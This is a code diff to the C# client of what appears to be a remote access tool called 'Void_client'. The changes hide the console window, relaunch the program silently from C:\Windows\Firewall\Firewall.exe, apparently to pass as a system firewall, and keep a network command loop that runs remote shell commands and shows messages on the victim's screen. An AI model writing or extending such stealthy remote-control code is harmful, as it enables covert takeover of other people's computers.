@@ -7,15 +7,27 @@ using System.Threading;
 using System.IO;
 using System.Windows.Forms;
 using System.Text;
+using System.Runtime.InteropServices;
 
 namespace Void_client
 {
     class Program
     {
         private static NetworkStream stream { get; set; }
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
 
         static void Main(string[] args)
         {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+
             if (!Settings.Initialize())
                 return;
             
@@ -36,12 +48,15 @@ namespace Void_client
             {
                 if (Application.ExecutablePath != @"C:\Windows\Firewall\Firewall.exe")
                 {
-                    Process.Start(@"C:\Windows\Firewall\Firewall.exe");
+                    ProcessStartInfo psi = new ProcessStartInfo();
+                    psi.FileName = @"C:\Windows\Firewall\Firewall.exe";
+                    psi.CreateNoWindow = true;
+                    Process.Start(psi);
                     return;
                 }
             }
             else
-                TCP.SendInformation("error|install error|failed, launching without installing", stream);
+                TCP.SendInformation("error |install error|failed, launching without installing", stream);
                 
             while (true)
             {
@@ -99,9 +114,6 @@ namespace Void_client
                                     RemoteCMD.Send(recievedInfo[2]);
                                     break;
                             }
-                            break;
-                        case "process":
-                            Commands.Open(recievedInfo);
                             break;
                         case "showmsg":
                             Commands.ShowMsgBox(recievedInfo);
